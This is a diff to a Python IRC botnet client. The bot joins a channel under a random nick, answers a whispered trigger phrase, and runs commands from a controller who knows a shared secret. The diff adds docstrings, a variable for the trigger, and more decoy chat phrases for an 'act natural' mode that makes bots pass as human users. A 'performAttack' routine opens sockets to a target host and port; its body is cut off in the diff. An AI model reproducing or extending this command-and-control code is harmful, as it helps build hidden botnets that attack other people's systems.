@@ -19,6 +19,14 @@ class colors:
 
 
 class TimerThread(threading.Thread):
+    """ TimerThread accepts a time interval, a time end interval and a function.
+    If timeEnd is specified as None, it will simply call the function every 'time' seconds.
+    If timeEnd is specified, it will call the function at a random duration between time and timeEnd seconds.
+
+    Start thread with TimerThread.start(). Stop with TimerThread.stop
+
+    TimerThread will finish execution of it's current iteration if stop is called while it is executing.
+    """
     def __init__(self, time, timeEnd, function):
         self._stopped = False
         self._time = time
@@ -30,7 +38,6 @@ class TimerThread(threading.Thread):
         threading.Thread.__init__(self)
 
     def run(self):
-
         while not self._stopped:
             self._function()
             timeToSleep = self._time if not self._timeEnd else random.randint(self._time, self._timeEnd)
@@ -41,6 +48,14 @@ class TimerThread(threading.Thread):
         
     
 class Bot:
+    """ 
+    Bot connects to a specified irc server/port/channel and randomizes a name where it waits commands.
+
+    The bot has a trigger phrase that, when seen in chat, will whisper the sender of the message with another trigger.
+
+    The trigger identifies the bot to the controller such that the controller can send it commands. Note that the trigger is NOT
+    the secret phrase that allows access to commands, but a semi-private method of conducting commands rather than announcing them to the server.
+    """
     def __init__(self, server, channel, port, secret):
         """ """
         self._server = server
@@ -49,7 +64,8 @@ class Bot:
         self._nick = ""
         self._secret = secret
         self._shutdown = False
-        self._naturalTimer = None # TimerThread(5, self.actNatural) #threading.Timer(5, self.actNatural)
+        self._naturalTimer = None
+        self._trigger = "heyyy what up mah glip glops?"
 
         self._attackcount = 0
         
@@ -203,7 +219,7 @@ class Bot:
             print("{0}Received shutdown signal{1}".format(colors.FAIL, colors.ENDC))
 
     def parsePrivMsg(self, sender, msg):
-        if msg == "heyyy what up mah glip glops?":
+        if msg == self._trigger:
             response = "PRIVMSG {0} :{1}\r\n".format(sender, "what is my purpose?").encode('utf-8')
             self.logSend(response)
         else:
@@ -214,6 +230,7 @@ class Bot:
                 return
             
             secret = msgParts[0]
+            # if first part of message is our known secret, continue with command
             if secret == self._secret:
                 command = msgParts[1]
                                 
@@ -262,16 +279,15 @@ class Bot:
                 elif command == "shutdown":
                     self._shutdown = True
                 elif command == "actnatural":
+                    # tells the bots to start or stop acting natural
                     if msgParts[2] == "true":
                         eprint("Acting natural..")
                         self._naturalTimer = TimerThread(time=5, timeEnd=10, function=self.actNatural)
                         self._naturalTimer.start()
-                        #self._naturalTimer.start()
                     elif msgParts[2] == "false":
                         eprint("Stopped acting natural..")
                         if self._naturalTimer:
                             self._naturalTimer.stop()
-                            #self._naturalTimer.cancel()
                         else:
                             eprint("Act natural timer was not setting. Ignoring command")
                     else:
@@ -279,12 +295,16 @@ class Bot:
 
 
     def actNatural(self):
+        """ to be called iteratively in combination with a timer thread. 
+        randomly chooses a phrase among many and sends it to the public channel.
+        """
         phrases = ["kapa kapa", "oyoyoyoyoyoy", "RUINED IT!!", "Saved it!!",
                    "Wat time is it?", "me gusta", "now THAT is funny.", "please be kind",
                    "wow im offended", "i dont care if ur offended, this is who i am",
                    "does anyone know how to get to falador?", "buying gf 248gp",
                    "ya manky chav", "WOWWWW", "how do i mute someone?", "press alt+f4",
-                   "wow you guys are mean"]
+                   "wow you guys are mean", "how do I send a private message?", "...I dont know you...",
+                   "a/s/l?", "18/f/cali", "noice.", "That can't be...", "42"]
 
         phrase = phrases[random.randint(0, len(phrases) - 1)]
         response = "PRIVMSG {0} :{1}\r\n".format(self._channel, phrase).encode('utf-8')
@@ -293,6 +313,7 @@ class Bot:
         
 
     def performAttack(self, host, port, sender):
+        """ attempts to perform an attack on a specified host/port number """
         atksock = socket.socket()
         self._attackcount = self._attackcount+1
         try:
